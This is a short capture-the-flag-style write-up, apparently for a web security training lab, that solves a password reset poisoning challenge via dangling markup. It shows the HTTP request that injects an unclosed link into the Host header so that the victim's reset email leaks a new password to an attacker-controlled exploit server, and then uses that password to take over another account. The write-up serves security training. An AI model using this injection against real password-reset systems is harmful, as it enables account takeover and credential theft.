# Password reset poisoning via dangling markup

**Request:**
The lab is vulnerable to password reset poisoning via dangling markup.

The goal is to login to Carlos's account.

`wiener:peter` can be used to login.

**Solution:**
I tried to change the password of my current user `wiener`. 

When I checked on the email, I saw the request came but not with the token on the URL.

It had the new password on the email body, which ould be viewed by using the option view raw.

Usual methods didn't work on changing the Host, using Burp Repeater on the `forgot password` request.

But, then after I tried to put some non-numeric domain on the Host, such as:

```http
POST /forgot-password HTTP/2
Host: 0a5f00ba03ab573e810180e400ba009e.web-security-academy.net:test
```
The response was `200 OK`, so I can use this vulnerability.

I put my exploit server instead of `test`, and it became:

```http
POST /forgot-password HTTP/2
Host: 0a5f00ba03ab573e810180e400ba009e.web-security-academy.net:'<a href="https://exploit-0a33000503d7571b81407fe001b60065.exploit-server.net/exploit
```

After I sent this, I viewed the access log on my exploit server, and I saw:

```http
GET /exploit/login'>click+here</a>+to+login+with+your+new+password:+ruqZ1DamYn</p><p>Thanks,<br/>Support+team</p>
```

So I used this password `ruqZ1DamYn`, and I got access to the `carlos` account.